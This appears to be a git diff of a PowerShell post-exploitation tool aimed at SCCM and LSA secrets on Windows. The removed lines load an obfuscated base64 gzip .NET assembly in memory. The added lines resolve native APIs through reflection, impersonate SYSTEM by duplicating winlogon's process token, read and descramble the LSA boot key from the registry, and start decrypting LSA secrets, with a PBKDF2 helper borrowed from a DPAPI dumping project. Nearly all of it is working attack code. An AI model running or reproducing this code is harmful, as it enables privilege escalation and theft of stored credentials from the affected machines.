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"))
-    $gzipStream = New-Object IO.Compression.GzipStream($lss, [IO.Compression.CompressionMode]::Decompress)
-    $memStream = New-Object System.IO.MemoryStream
-    $gzipStream.CopyTo($memStream)
-    $reflectedAssembly = [System.Reflection.Assembly]::Load($memStream.ToArray())
-    $currentConsoleOutput = [Console]::Out
-    $textWriter = New-Object IO.StringWriter
-    [Console]::SetOut($textWriter)
-    [LocalSCCM.Program]::Main()
-    [Console]::SetOut($currentConsoleOutput)
-    $textWriter.ToString() | Write-Output
+    # Load the CLR helper type from System.dll
+    $gacAsm = [AppDomain]::CurrentDomain.GetAssemblies() |
+        Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\')[-1] -eq 'System.dll' }
+    
+    $helperType = $gacAsm.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $ptrOverload = $helperType.GetMethod('GetProcAddress', [Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::Static, $null, [Type[]] @([IntPtr], [string]),$null)
+
+    if ($ptrOverload)
+    {
+        $moduleHandle = $helperType.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))
+        return $ptrOverload.Invoke($null, @($moduleHandle, $functionName))
+    }
+
+    # Fallback to HandleRef overload
+    $handleRefOverload = $helperType.GetMethod('GetProcAddress', [Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::Static, $null,[Type[]] @([System.Runtime.InteropServices.HandleRef], [string]),$null)
+    if (-not $handleRefOverload)
+    {
+        throw 'Could not find a suitable GetProcAddress overload on this system.'
+    }
+
+    $moduleHandle = $helperType.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))
+    $handleRef = New-Object System.Runtime.InteropServices.HandleRef($null, $moduleHandle)
+    return $handleRefOverload.Invoke($null, @($handleRef, $functionName))
 }
 
-$Out = Invoke-LocalSCCM 
+function Invoke-GetDelegate {
+    param ([Type[]] $parameterTypes, [Type] $returnType = [Void])
+
+    # Create a dynamic in‑memory delegate type
+    $asmName = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+    $asmBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($asmName, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $modBuilder = $asmBuilder.DefineDynamicModule('InMemoryModule', $false)
+
+    $typeBuilder = $modBuilder.DefineType(
+        'MyDelegateType',
+        [System.Reflection.TypeAttributes]::Class -bor
+        [System.Reflection.TypeAttributes]::Public -bor
+        [System.Reflection.TypeAttributes]::Sealed -bor
+        [System.Reflection.TypeAttributes]::AnsiClass -bor
+        [System.Reflection.TypeAttributes]::AutoClass,
+        [System.MulticastDelegate]
+    )
+
+    $ctor = $typeBuilder.DefineConstructor(
+        [System.Reflection.MethodAttributes]::RTSpecialName -bor
+        [System.Reflection.MethodAttributes]::HideBySig -bor
+        [System.Reflection.MethodAttributes]::Public,
+        [System.Reflection.CallingConventions]::Standard,
+        $parameterTypes
+    )
+    $ctor.SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime -bor
+                                 [System.Reflection.MethodImplAttributes]::Managed)
+
+    $invokeMethod = $typeBuilder.DefineMethod(
+        'Invoke',
+        [System.Reflection.MethodAttributes]::Public -bor
+        [System.Reflection.MethodAttributes]::HideBySig -bor
+        [System.Reflection.MethodAttributes]::NewSlot -bor
+        [System.Reflection.MethodAttributes]::Virtual,
+        $returnType,
+        $parameterTypes
+    )
+    $invokeMethod.SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime -bor
+                                         [System.Reflection.MethodImplAttributes]::Managed)
+
+    return $typeBuilder.CreateType()
+}
+
+$FnOpenProcess             = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Kernel32.dll' -functionName 'OpenProcess'             ),(Invoke-GetDelegate @([UInt32],[bool],[UInt32])([IntPtr])))
+$FnOpenProcessToken        = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'OpenProcessToken'        ),(Invoke-GetDelegate @([IntPtr],[UInt32],[IntPtr].MakeByRefType())([bool])))
+$FnDuplicateTokenEx        = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'DuplicateTokenEx'        ),(Invoke-GetDelegate @([IntPtr],[UInt32],[IntPtr],[UInt32],[UInt32],[IntPtr].MakeByRefType())([bool])))
+$FnImpersonateLoggedOnUser = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'ImpersonateLoggedOnUser' ),(Invoke-GetDelegate @([IntPtr])([bool])))
+$FnRegOpenKeyEx            = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'RegOpenKeyExA'           ),(Invoke-GetDelegate @([Int32],[string],[Int32],[Int32],[IntPtr].MakeByRefType())([Int32])))
+$FnRegQueryValueEx         = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'RegQueryValueExA'        ),(Invoke-GetDelegate @([IntPtr],[string],[IntPtr],[UInt32].MakeByRefType(),[IntPtr],[UInt32].MakeByRefType())([Int32])))
+$FnRegQueryInfoKey         = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'RegQueryInfoKeyA'        ),(Invoke-GetDelegate @([Int32],[System.Text.StringBuilder],[Int32].MakeByRefType(),[Int32],[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[Int32].MakeByRefType(),[IntPtr])([Int32])))
+$FnRegCloseKey             = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'RegCloseKey'             ),(Invoke-GetDelegate @([Int32])([Int32])))
+$FnRevertToSelf            = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName 'Advapi32.dll' -functionName 'RevertToSelf'            ),(Invoke-GetDelegate -parameterTypes $null -returnType ([bool])))
+
+
+
+function Invoke-Impersonate {
+
+    $currentSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+    
+    if ($currentSid -eq 'S-1-5-18')
+    { 
+        return $true 
+    }
+
+    $winlogonId = (Get-Process -Name 'winlogon' -ErrorAction Stop | Select-Object -First 1 -ExpandProperty Id)
+    
+    $processHandle = $FnOpenProcess.Invoke(0x400, $true, [int]$winlogonId)
+    
+    if ($processHandle -eq [IntPtr]::Zero) 
+    { 
+        return $false
+    }
+
+    $tokenHandle = [IntPtr]::Zero
+    
+    if (-not $FnOpenProcessToken.Invoke($processHandle, 0x0E, [ref]$tokenHandle))
+    { 
+        return $false
+    }
+
+    $dupHandle = [IntPtr]::Zero
+    
+    if (-not $FnDuplicateTokenEx.Invoke($tokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$dupHandle))
+    { 
+        return $false
+    }
+
+    try {
+        
+        if (-not $FnImpersonateLoggedOnUser.Invoke($dupHandle))
+        { 
+            return $false
+        }
+        
+        $newSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+        
+        return ($newSid -eq 'S-1-5-18')
+    }
+    
+    catch
+    {
+        return $false
+    }
+}
+
+
+# Taken from this project https://raw.githubusercontent.com/tmenochet/PowerDump/refs/heads/master/DpapiDump.ps1
+
+if (-not [Type]::GetType('Pbkdf2', $false, $false)) {
+Add-Type -TypeDefinition @"
+using System;
+using System.Security.Cryptography;
+
+public class Pbkdf2 {
+    public Pbkdf2(HMAC algorithm, Byte[] password, Byte[] salt, Int32 iterations) {
+        if (algorithm == null) { throw new ArgumentNullException("algorithm", "Algorithm cannot be null."); }
+        if (salt == null) { throw new ArgumentNullException("salt", "Salt cannot be null."); }
+        if (password == null) { throw new ArgumentNullException("password", "Password cannot be null."); }
+        this.Algorithm = algorithm;
+        this.Algorithm.Key = password;
+        this.Salt = salt;
+        this.IterationCount = iterations;
+        this.BlockSize = this.Algorithm.HashSize / 8;
+        this.BufferBytes = new byte[this.BlockSize];
+    }
+    
+    private readonly int BlockSize;
+    private uint BlockIndex = 1;
+    private byte[] BufferBytes;
+    private int BufferStartIndex = 0;
+    private int BufferEndIndex = 0;
+    
+    public HMAC Algorithm { get; private set; }
+    public Byte[] Salt { get; private set; }
+    public Int32 IterationCount { get; private set; }
+    
+    public Byte[] GetBytes(int count, string algorithm = "sha512") {
+        byte[] result = new byte[count];
+        int resultOffset = 0;
+        int bufferCount = this.BufferEndIndex - this.BufferStartIndex;
+
+        if (bufferCount > 0) {
+            if (count < bufferCount) {
+                Buffer.BlockCopy(this.BufferBytes, this.BufferStartIndex, result, 0, count);
+                this.BufferStartIndex += count;
+                return result;
+            }
+            Buffer.BlockCopy(this.BufferBytes, this.BufferStartIndex, result, 0, bufferCount);
+            this.BufferStartIndex = this.BufferEndIndex = 0;
+            resultOffset += bufferCount;
+        }
+        
+        while (resultOffset < count) {
+            int needCount = count - resultOffset;
+            if (algorithm.ToLower() == "sha256")
+                this.BufferBytes = this.Func(false);
+            else
+                this.BufferBytes = this.Func();
+                
+            if (needCount > this.BlockSize) {
+                Buffer.BlockCopy(this.BufferBytes, 0, result, resultOffset, this.BlockSize);
+                resultOffset += this.BlockSize;
+            } else {
+                Buffer.BlockCopy(this.BufferBytes, 0, result, resultOffset, needCount);
+                this.BufferStartIndex = needCount;
+                this.BufferEndIndex = this.BlockSize;
+                return result;
+            }
+        }
+        return result;
+    }
+    
+    private byte[] Func(bool mscrypto = true) {
+        var hash1Input = new byte[this.Salt.Length + 4];
+        Buffer.BlockCopy(this.Salt, 0, hash1Input, 0, this.Salt.Length);
+        Buffer.BlockCopy(GetBytesFromInt(this.BlockIndex), 0, hash1Input, this.Salt.Length, 4);
+        var hash1 = this.Algorithm.ComputeHash(hash1Input);
+        byte[] finalHash = hash1;
+        
+        for (int i = 2; i <= this.IterationCount; i++) {
+            hash1 = this.Algorithm.ComputeHash(hash1, 0, hash1.Length);
+            for (int j = 0; j < this.BlockSize; j++) {
+                finalHash[j] = (byte)(finalHash[j] ^ hash1[j]);
+            }
+            if (mscrypto)
+                Array.Copy(finalHash, hash1, hash1.Length);
+        }
+        
+        if (this.BlockIndex == uint.MaxValue) { 
+            throw new InvalidOperationException("Derived key too long."); 
+        }
+        this.BlockIndex += 1;
+        return finalHash;
+    }
+    
+    private static byte[] GetBytesFromInt(uint i) {
+        var bytes = BitConverter.GetBytes(i);
+        if (BitConverter.IsLittleEndian) {
+            return new byte[] { bytes[3], bytes[2], bytes[1], bytes[0] };
+        } else {
+            return bytes;
+        }
+    }
+}
+"@ -ReferencedAssemblies System.Security
+}
+
+
+
+function Get-BootKey {
+
+    # Retrieves the boot key by querying specific registry keys under SYSTEM hive and descrambles it. Returns the boot key as a byte array.
+    # Hand-off: Returns boot key to Get-LSAKey function.
+
+    $ScrambledKey = [System.Text.StringBuilder]::new()
+    $keyNames     = @("JD", "Skew1", "GBG", "Data")
+
+    foreach ($Key in $keyNames)
+    {
+        [string] $KeyPath = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\$Key"
+        $ClassVal         = [System.Text.StringBuilder]::new(1024)
+        $Len              = 1024
+        $hKey             = [IntPtr]::Zero
+        $dummy            = [IntPtr]::Zero
+
+        $Result = $FnRegOpenKeyEx.Invoke(0x80000002, $KeyPath, 0x0, 0x19, [ref]$hKey)
+        
+        if ($Result -ne 0)
+        {
+            $ErrCode = [System.Runtime.Interopservices.Marshal]::GetLastWin32Error()
+            Write-Host "[!] Error opening $KeyPath : $ErrCode"
+            return $null
+        }
+
+        $Result = $FnRegQueryInfoKey.Invoke($hKey, $ClassVal, [ref]$Len, 0x0, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [IntPtr]::Zero)
+        
+        if ($Result -ne 0)
+        {
+            $ErrCode = [System.Runtime.Interopservices.Marshal]::GetLastWin32Error()
+            Write-Host "[!] Error querying $KeyPath : $ErrCode"
+            return $null
+        }
+
+        $FnRegCloseKey.Invoke($hKey)    > $null
+        $ScrambledKey.Append($ClassVal) > $null
+    }
+
+    $Descramble = @(0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3, 0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7)
+    $BootKey    = foreach ($i in $Descramble) { [Convert]::ToByte("$($ScrambledKey[$i * 2])$($ScrambledKey[$i * 2 + 1])", 16) }
+    $HexString  = ($BootKey | ForEach-Object { $_.ToString("X2") }) -join ""
+
+    return $BootKey
+}
+
+function Get-LsaSha256Hash {
+    param ([byte[]] $Key, [byte[]] $RawData)
+
+    # Computes a SHA256 hash of a key combined with repeated raw data. Used for deriving encryption keys in LSA decryption.
+    # Hand-off: Returns hash to Get-LSAKey/Get-LSASecret for key derivation.
+
+    $bufferSize = $Key.Length + ($RawData.Length * 1000)
+    $buffer     = New-Object byte[] $bufferSize
